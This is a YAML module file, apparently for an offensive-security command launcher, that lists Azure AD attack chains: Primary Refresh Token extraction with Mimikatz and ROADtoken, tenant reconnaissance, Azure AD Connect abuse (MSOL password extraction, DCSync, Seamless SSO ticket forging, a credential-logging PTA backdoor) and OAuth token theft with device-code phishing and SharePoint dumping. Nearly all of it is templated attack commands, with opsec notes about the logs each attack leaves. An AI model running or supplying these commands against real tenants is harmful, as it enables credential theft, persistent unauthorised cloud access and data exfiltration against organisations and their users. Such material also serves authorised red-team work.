  - id: cloud_prt_theft
    name: PRT — Primary Refresh Token Theft and Abuse
    tab: Credential Attacks
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [azure, aad, prt, token, hybrid, office365, intune]
    description: >
      Primary Refresh Tokens (PRTs) are issued by Azure AD to domain-joined
      or AAD-registered devices. They grant seamless SSO to all Azure AD
      resources including Office 365, Azure portal, and enterprise apps.
      Stealing a PRT gives cloud access without MFA in many configurations.
    commands:
      - label: "Check if device is AAD joined / hybrid joined"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'dsregcmd /status | findstr /i \"AzureAD\\|DomainJoined\\|WorkplaceJoined\"'"
      - label: "Extract PRT with Mimikatz (requires SYSTEM)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Invoke-Mimikatz -Command \"sekurlsa::cloudap\" \"sekurlsa::dpapi\"'"
      - label: "Extract PRT with ROADtoken (requires local admin)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'ROADtoken.exe'"
      - label: "Use PRT with roadrecon/TokenTactics"
        cmd: "python3 TokenTactics.py -prt {PRT_VALUE} -tenantId {TENANT_ID} -clientId {CLIENT_ID}"
      - label: "Get access token for Microsoft Graph"
        cmd: "python3 ROADtools/roadrecon/roadrecon.py auth --prt {PRT_VALUE} --prt-sessionkey {SESSION_KEY}"
      - label: "Generate SSO cookie for web access"
        cmd: "python3 RequestAADRefreshToken.py -p {PRT_VALUE} -s {SESSION_KEY} -t {TENANT_ID}"
    opsec: >
      PRT extraction is local DPAPI/LSASS access — generates Sysmon Event 10.
      PRT use generates Azure AD sign-in events with device correlation.
      Azure AD Conditional Access may block PRT reuse from unexpected locations.
    cleanup: []

  - id: cloud_aad_enum
    name: Azure AD — Enumeration via roadrecon / AADInternals
    tab: Enumeration
    requires: [DOMAIN, USERNAME, PASSWORD]
    tags: [azure, aad, enum, roadrecon, aadinternals, tenant, o365]
    description: >
      Enumerate Azure AD tenant for users, groups, applications, service
      principals, conditional access policies, and admin role assignments.
      roadrecon and AADInternals provide comprehensive Azure AD reconnaissance
      using MS Graph API.
    commands:
      - label: "roadrecon auth (device code flow — no app registration needed)"
        cmd: "roadrecon auth --device-code"
      - label: "roadrecon auth with credentials"
        cmd: "roadrecon auth -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}'"
      - label: "roadrecon gather — full tenant enumeration"
        cmd: "roadrecon gather"
      - label: "roadrecon — open GUI"
        cmd: "roadrecon-gui"
      - label: "AADInternals — get tenant info (no auth)"
        cmd: "Invoke-AADIntReconAsOutsider -DomainName {DOMAIN} | Format-Table"
      - label: "AADInternals — get all users"
        cmd: "Get-AADIntUsers -AccessToken {ACCESS_TOKEN} | Select-Object UserPrincipalName,DisplayName,IsAdmin"
      - label: "AADInternals — find admin role members"
        cmd: "Get-AADIntGlobalAdmins -AccessToken {ACCESS_TOKEN}"
      - label: "Check if SSPR enabled (password reset attack surface)"
        cmd: "roadrecon gather --config policies"
    opsec: >
      MS Graph API calls generate Azure AD audit logs. Device code auth
      generates sign-in events. All activity visible in Azure AD sign-in logs.
    cleanup: []

  - id: cloud_msol_hybrid
    name: Azure AD Connect — Full Hybrid Attack Chain
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [azure, aad-connect, msol, hybrid, dcsync, seamless-sso, pta]
    description: >
      Azure AD Connect creates multiple attack surfaces in hybrid environments.
      MSOL account has DCSync rights on-prem. Seamless SSO Kerberos account
      (AZUREADSSOACC$) allows forging Kerberos tickets for cloud auth.
      PTA (Pass-Through Authentication) agent can be abused for credential capture.
    commands:
      - label: "Find Azure AD Connect server"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(description=*Azure AD*)' 'sAMAccountName description cn'"
      - label: "Extract MSOL account password (run on AADC server)"
        cmd: "nxc smb {AADC_SERVER} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M msol"
      - label: "DCSync with MSOL account"
        cmd: "impacket-secretsdump '{DOMAIN}/{MSOL_ACCOUNT}:{MSOL_PASSWORD}'@{DC_IP} -just-dc-ntlm"
      - label: "Get AZUREADSSOACC$ hash for Seamless SSO ticket forging"
        cmd: "impacket-secretsdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} -just-dc-user 'AZUREADSSOACC$'"
      - label: "Forge Kerberos ticket for cloud auth via Seamless SSO"
        cmd: "impacket-ticketer -nthash {AZUREADSSOACC_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn 'HTTP/autologon.microsoftazuread-sso.com' {TARGET_USER}"
      - label: "PTA agent backdoor (if you have SYSTEM on AADC server)"
        cmd: "AADInternals: Install-AADIntPTASpy; Get-AADIntPTASpyLog"
    opsec: >
      MSOL extraction is local on AADC server. DCSync generates 4662.
      AZUREADSSOACC ticket use generates Azure AD sign-in with Seamless SSO.
      PTA spy logs all credentials as they're validated — very impactful.
    cleanup:
      - label: "Remove PTA spy if installed"
        cmd: "Uninstall-AADIntPTASpy"

  - id: cloud_token_tactics
    name: OAuth Token Abuse — Steal and Abuse Azure AD Tokens
    tab: Credential Attacks
    requires: [USERNAME, DOMAIN]
    tags: [azure, oauth, token, office365, teams, sharepoint, graph]
    description: >
      Steal OAuth refresh tokens from browsers, memory, or token caches then
      use them for persistent cloud access. Tokens grant access to Teams,
      SharePoint, OneDrive, Exchange Online, and Azure without passwords.
      TokenTactics2 automates token manipulation and persistence.
    commands:
      - label: "Find cached Azure tokens on target"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X \"Get-ChildItem -Path '$env:LOCALAPPDATA\\Microsoft\\TokenBroker' -Recurse | Select-Object FullName\""
      - label: "Extract Teams tokens from browser"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X \"Get-Content '$env:APPDATA\\Microsoft\\Teams\\Cookies' | ConvertFrom-Json | Where-Object {$_.name -like '*token*'}\""
      - label: "TokenTactics2 — device code phishing"
        cmd: "Invoke-DeviceCodePhishing -ClientId 'd3590ed6-52b3-4102-aeff-aad2292ab01c'"
      - label: "TokenTactics2 — refresh to different resource"
        cmd: "Invoke-RefreshToSharePointToken -domain {DOMAIN} -refreshToken {REFRESH_TOKEN}"
      - label: "TokenTactics2 — refresh to MS Graph"
        cmd: "Invoke-RefreshToMSGraphToken -domain {DOMAIN} -refreshToken {REFRESH_TOKEN}"
      - label: "Use token to access SharePoint/Teams/OneDrive"
        cmd: "Invoke-DumpSharePointFiles -AccessToken {ACCESS_TOKEN} -domain {DOMAIN}"
    opsec: >
      Token use generates Azure AD sign-in events with client app and IP.
      Conditional Access policies may block tokens used from unexpected locations.
      Token theft itself is local — no Azure events until the token is used.
    cleanup: []

